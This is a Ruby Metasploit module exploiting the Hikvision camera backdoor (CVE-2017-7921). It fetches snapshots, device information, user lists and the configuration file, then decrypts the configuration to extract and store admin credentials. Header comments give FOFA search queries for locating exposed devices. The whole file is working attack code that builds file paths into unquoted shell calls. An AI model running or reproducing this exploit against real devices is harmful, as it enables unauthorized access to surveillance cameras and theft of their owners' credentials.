require 'msf/core'
#fofa: app="HIKVISION-视频监控"
#fofa: app="HIKVISION-视频监控"&&country="CN"

class MetasploitModule < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Hikvision Exploit and Configuration Decryptor',
                      'Description'    => %q{
        This module exploits the Hikvision backdoor and retrieves the device's configuration file. It then attempts to decrypt the configuration file to obtain the admin user's credentials.
      },
                      'Author'         => ['se2o'],
                      'License'        => MSF_LICENSE,
                      'References'     =>
                        [
                          [ 'CVE', '2017-7921' ]
                        ],
                      'DisclosureDate' => 'Apr 26 2023',
                      'DefaultOptions' => { 'SSL' => false },
                      'Platform'       => 'win',
                      'Targets'        => [[ 'Automatic', {}]],
                      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'The base path to the vulnerable application', '/'])
      ])
  end

  def check
    res = send_request_cgi({
                             'method' => 'GET',
                             'uri' => normalize_uri(target_uri.path, 'Security/users'),
                             'vars_get' => { 'auth' => 'YWRtaW46MTEK' }
                           })

    if res && res.code == 200
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    print_status("Target: #{rhost}:#{rport}")

    backdoor = '?auth=YWRtaW46MTEK'
    payload1 = 'onvif-http/snapshot'
    payload2 = 'System/deviceInfo'
    payload3 = 'Security/users'
    payload4 = 'System/configurationFile'

    base_output_dir = "/root/cve_file/cve-2017-7921/#{rhost}_#{rport}/"
    FileUtils.mkdir_p(base_output_dir) unless File.directory?(base_output_dir)

    snapshot_path = "#{base_output_dir}snapshot.png"
    device_info_path = "#{base_output_dir}device-infos"
    users_path = "#{base_output_dir}users"
    config_file_path = "#{base_output_dir}config-file"

    success_messages = []

    res = send_request_cgi({'method' => 'GET', 'uri' => normalize_uri(target_uri.path, payload1) + backdoor})
    if res && res.code == 200
      File.write(snapshot_path, res.body)
      success_messages << "快照已获取. 路径: #{snapshot_path}"
      success = true
    end

    res = send_request_cgi({'method' => 'GET', 'uri' => normalize_uri(target_uri.path, payload2) + backdoor})
    if res && res.code == 200
      File.write(device_info_path, res.body)
      success_messages << "设备信息已获取. 路径: #{device_info_path}"
      success = true
    end

    res = send_request_cgi({'method' => 'GET', 'uri' => normalize_uri(target_uri.path, payload3) + backdoor})
    if res && res.code == 200
      File.write(users_path, res.body)
      success_messages << "用户文件已获取. 路径: #{users_path}"
      success = true
    end

    res = send_request_cgi({'method' => 'GET', 'uri' => normalize_uri(target_uri.path, payload4) + backdoor})
    print_good("Data collection checkpoint start")
    if res && res.code == 200
      #print_good("Data collection checkpoint start")
      File.write(config_file_path, res.body)
      success_messages << "配置文件已获取. 路径: #{config_file_path}"
      success = true

      decrypted_config_path = "#{base_output_dir}config-file-decrypted.txt"

      # Call the Python script to decrypt the configuration file
      #print_status("Executing config-decryptor.py")
      system("python /root/msf-py/py.poc/cve-2017-7921/config-decryptor.py #{config_file_path} > #{decrypted_config_path}")
      #print_status("config-decryptor.py execution completed")
      #print_status("config_file_path: #{config_file_path}")

      # Extract the username and password from the decrypted configuration file
      #creds = `python3 -c "import ast; a = ast.literal_eval(open('#{decrypted_config_path}').readlines()[0]); print(':'.join(a[[x for x, y in enumerate(a) if y == 'admin'][-1]:][:2]))"`
      creds = `python3 -c "import ast; a = ast.literal_eval(open('#{decrypted_config_path}').readlines()[0]); print(':'.join(a[[x for x, y in enumerate(a) if y == 'admin'][-1]:][:2]))"`.strip
      #print_status("Extracted credentials: #{creds}")


      # Save the extracted credentials to a file
      unless creds.empty?
        credentials_path = "#{base_output_dir}#{rhost}_#{rport}_passwd"
        File.write(credentials_path, "admin: #{creds.strip}")
        print_good("Admin 凭据已获取: 用户名:密码 #{creds.strip} (存储路径 #{credentials_path})")
        store_valid_credential(user: 'admin', private: creds.strip)
      else
        print_error("在解密的配置中未找到admin凭据.")
      end
    else
      print_error("配置文件下载失败.")
    end

    success_messages.each { |message| print_good(message) }

    print_good("Data collection checkpoint end")

    #if success
    #print_good('true')
    #else
    #print_error('false')
    #end

  end
end

